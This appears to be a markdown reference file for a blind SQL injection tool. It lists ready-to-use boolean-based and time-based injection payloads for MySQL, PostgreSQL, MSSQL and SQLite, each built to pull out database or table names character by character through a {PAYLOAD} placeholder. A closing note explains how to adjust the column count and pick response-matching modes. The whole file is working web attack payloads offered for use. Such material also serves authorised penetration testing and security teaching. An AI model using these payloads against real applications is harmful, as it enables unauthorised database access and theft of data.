
                                                                                                    
                                                                                                    ```markdown
                                                                                                    # Payload Examples
                                                                                                    
                                                                                                    ## MySQL
                                                                                                    
                                                                                                    ### Boolean-based
                                                                                                    ```
                                                                                                    ' UNION SELECT 1,2,3,4 WHERE database() LIKE '{PAYLOAD}%'-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ### Time-based
                                                                                                    ```
                                                                                                    ' OR IF(SUBSTRING((SELECT database()),1,LENGTH('{PAYLOAD}'))='{PAYLOAD}',SLEEP(3),0)-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ## PostgreSQL
                                                                                                    
                                                                                                    ### Boolean-based
                                                                                                    ```
                                                                                                    ' UNION SELECT 1,2,3,4 WHERE current_database() LIKE '{PAYLOAD}%'-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ### Time-based
                                                                                                    ```
                                                                                                    ' OR CASE WHEN SUBSTRING(current_database(),1,LENGTH('{PAYLOAD}'))='{PAYLOAD}' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ## MSSQL
                                                                                                    
                                                                                                    ### Boolean-based
                                                                                                    ```
                                                                                                    ' UNION SELECT 1,2,3,4 WHERE DB_NAME() LIKE '{PAYLOAD}%'-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ### Time-based
                                                                                                    ```
                                                                                                    '; IF SUBSTRING(DB_NAME(),1,LENGTH('{PAYLOAD}'))='{PAYLOAD}' WAITFOR DELAY '0:0:3'-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ## SQLite
                                                                                                    
                                                                                                    ### Boolean-based
                                                                                                    ```
                                                                                                    ' UNION SELECT 1,2,3,4 WHERE (SELECT group_concat(name) FROM sqlite_master WHERE type='table') LIKE '{PAYLOAD}%'-- -
                                                                                                    ```
                                                                                                    
                                                                                                    ---
                                                                                                    
                                                                                                    **Note:** Adjust the number of columns (`1,2,3,4`) to match the vulnerable query.  
                                                                                                    Use `--match length`, `--match status`, `--match regex`, or `--match contains` depending on how the application responds to TRUE vs FALSE.
                                                                                                    ```
                                                                                                    
                                                                                                   
